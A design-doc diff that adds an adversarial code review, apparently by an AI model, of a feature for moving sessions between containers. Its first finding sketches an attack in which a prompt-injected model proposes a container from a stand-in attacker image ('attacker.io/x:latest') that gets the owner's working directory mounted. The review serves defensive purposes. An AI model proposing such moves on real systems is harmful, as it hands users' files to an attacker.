@@ -506,4 +506,59 @@ untouched — D10: no wire change, no `protocol.d/` note).
 
 ## Review
 
-*— (pending)*
+### H1 — fresh-context adversarial review (scope: `git diff main...HEAD`, slice H1)
+
+**Verdict: REQUEST-CHANGES**
+
+**Findings (HIGH/MEDIUM only)**
+
+1. **HIGH — the owner approves a container whose image they never see.**
+   `cli/src/hop-proposal.ts:176-181`: `proposalNotice` turns any `container`
+   spec into "a container" and drops `spec.image`. D9 says the prompt "shows
+   sanitized args". Scenario: a hostile pod, or a prompt-injected model, calls
+   `move_session{target:"container", image:"attacker.io/x:latest", reason:"faster builds"}`.
+   The owner reads `_the model proposes moving this session to a container — faster builds_`
+   (reproduced in `.tentacle/tmp/session-hop/review/r.ts`) and says Yes. The
+   attacker's image then gets the owner's cwd bind-mounted (D6) and runs the
+   session's tools. This breaks §7 "pod not trusted": the laptop prompt is the
+   only gate, and it hides the one argument that matters. Fix: show the image
+   through `untrustedText` (or "the default image"), and add a test plus a
+   mutation for it.
+2. **MEDIUM — the tool path and `/move` accept different grammars.**
+   `hop-proposal.ts:21-25,132-141` accepts `{engine:"docker", container:"x"}`.
+   `hop-command.ts:141-143` refuses the same spec as a typed `/move`. That
+   contradicts the module's own claim that "a typed `/move` and a proposed
+   move are the same thing everywhere downstream" (`hop-command.ts:21-22`). A
+   proposed docker spec with a container makes `samePlace`/`workloadText`
+   (`hop-plan.ts:51,67`) print `docker:box/x`, and H6 must then guess what it
+   means. The zod schema also allows any characters in `name`/`container`
+   (`:`, `/`, control bytes). `attachVerdict` and `hopDelete` (`hop-plan.ts:146-156,180`)
+   put those names into notices WITHOUT `untrustedText`, though they came
+   from a proposal. Fix: one shared workload validator for both paths, and
+   sanitize the names in those notices.
+3. **MEDIUM (process) — the signature may be wrong.** The commit `a8c2b6a` is
+   titled "exec (deepseek)", but the Execution section is signed
+   `claude-opus-5-5`. §10 requires the signature of the model that wrote it.
+   The orchestrator must confirm which model executed and correct the
+   signature.
+
+**Gate:** I ran only the touched files: 42 pass / 0 fail, 97 expects.
+`bun run lint` clean (1118 files). `bun run typecheck` 0. I did not re-run
+the full `bun test`.
+**Mutation:** I dropped `queued > 0` from `hopPlan` (D4). "queued messages run
+first" FAILS (18/1). Reverted, and `git status` is clean. The executor's
+M1–M11 table looks plausible: the tests name the property they pin.
+**Attacks tried:** (a) a hidden image in the proposal → finding 1. (b) The
+grammar of the proposal path vs `/move` → finding 2. (c) A refusal must beat a
+queue (jobs/sub-agents during a running turn): it holds, and the reason is
+documented. (d) A foreign turn, or a failed call, must never propose: it
+holds (`hop-proposal.ts:73,92`). (e) Deleting a workload this hop did not
+create: refused (`hop-plan.ts:179`). (f) Reverted mutation, tree
+byte-identical: it holds.
+**What holds:** the modules are pure (no IO, no React). There is no protocol
+change (D10). Deletes are only decided, never executed. `keep` defaults to
+true on both paths.
+**Note:** the reviewer is Claude Opus. If the executor really was DeepSeek,
+this is a different model family, which is good for blind spots.
+
+*— claude-opus-5-5, 2026-11-14*
